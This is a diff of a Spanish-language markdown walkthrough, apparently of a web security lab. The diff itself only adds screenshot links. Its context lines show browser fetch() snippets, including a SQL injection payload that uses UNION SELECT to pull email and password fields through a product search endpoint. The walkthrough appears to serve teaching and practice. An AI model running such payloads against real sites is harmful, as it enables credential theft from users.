@@ -574,6 +574,8 @@ fetch('/rest/products/search?q=')
   .then(r => r.json())
   .then(console.log)
 ```
+<img width="940" height="602" alt="image" src="https://github.com/user-attachments/assets/82aabccd-dd08-44f7-bec9-23f11a301eaf" />
+
 
 **Resultado esperado**:
 
@@ -591,6 +593,9 @@ fetch("/rest/products/search?q=qwert'))UNION%20SELECT%20email,password,3,4,5,6,7
   .then(r => r.json())
   .then(console.log)
 ```
+<img width="940" height="483" alt="image" src="https://github.com/user-attachments/assets/fe72b08e-bdcd-46eb-8259-05c4a367c35d" />
+<img width="940" height="471" alt="image" src="https://github.com/user-attachments/assets/bcb8d79d-90e1-4b9a-ac49-8696380e83b1" />
+
 
 **Qué hace este comando**:
 
